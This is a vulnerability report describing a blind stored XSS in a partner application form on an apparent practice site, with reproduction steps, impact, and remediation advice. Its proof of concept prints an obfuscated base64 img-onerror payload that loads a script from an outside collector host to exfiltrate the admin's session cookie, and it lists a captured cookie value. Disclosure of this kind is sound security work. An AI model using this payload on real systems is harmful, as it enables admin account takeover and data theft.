## Title
Blind XSS in Partner Application Form Fields - PartnerHub

## Description
**Affected URL:** https://partnerhub.pwnedbox.site/apply.php (triggers on https://partnerhub.pwnedbox.site/admin/view.php?id=1)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the partner application submission form on `partnerhub.pwnedbox.site`. Input submitted in the **What do you offer?** (Capabilities), **Relevant experience**, and **What would you like to achieve together?** (Partnership goals) fields is stored without HTML encoding and renders directly in the DOM when an administrator opens the application in the backend (`/admin/view.php`). Because the script executes inside an authenticated admin session and `PHPSESSID` lacks the `HttpOnly` flag, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://partnerhub.pwnedbox.site/apply.php`, fill in the required fields, paste the Blind XSS payload into **What do you offer?**, **Relevant experience**, and **What would you like to achieve together?**, and click **Submit application**.
2. Log in to the admin panel (`https://partnerhub.pwnedbox.site/admin/index.php`) and open the submitted application (`/admin/view.php?id=1`).
3. Observe the payload execute immediately in the **Capabilities**, **Relevant experience**, and **Partnership goals** sections, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://partnerhub.pwnedbox.site/apply.php` (`What do you offer?`, `Relevant experience`, and `What would you like to achieve together?` fields)

**Trigger Endpoint:** `https://partnerhub.pwnedbox.site/admin/view.php?id=1`

**Payload:**
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
```

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://partnerhub.pwnedbox.site/admin/view.php?id=1`
- **Referrer:** `https://partnerhub.pwnedbox.site/admin/index.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=40ea8c54cb3455688e4e76b37e167faa`

**Visual Evidence:**
- Partner application form on `partnerhub.pwnedbox.site/apply.php` with the payload entered in the **What do you offer?**, **Relevant experience**, and **What would you like to achieve together?** fields.
  <img width="1270" height="925" alt="image" src="https://github.com/user-attachments/assets/865a1baa-5866-497d-b8c0-07ee16a39cd8" /><br><br>

- Admin application view (`/admin/view.php?id=1`) displaying the rendered broken image icons under **Capabilities**, **Relevant experience**, and **Partnership goals** where the script fired, alongside Browser Storage showing `PHPSESSID` with `HttpOnly` set to `false`.
  <img width="1277" height="937" alt="image" src="https://github.com/user-attachments/assets/120db337-d86c-4a88-8597-d3fa2c28dfbf" /><br><br>

- Blind XSS collector report confirming execution on `/admin/view.php?id=1` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1550" height="1042" alt="image" src="https://github.com/user-attachments/assets/5cd756b5-895f-4e10-a124-dc5028779904" /><br>


## Impact
Because the payload executes automatically when an administrator reviews incoming partner applications:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, update, or manage all submitted partner applications, company profiles, and reviewer notes.
- **Persistent Compromise:** Attackers can use the hijacked admin session to approve or alter application statuses, send applicant updates, or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied application fields before rendering them in `/admin/view.php` and `/admin/index.php`.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block inline event handlers like `onerror` and restrict external requests.
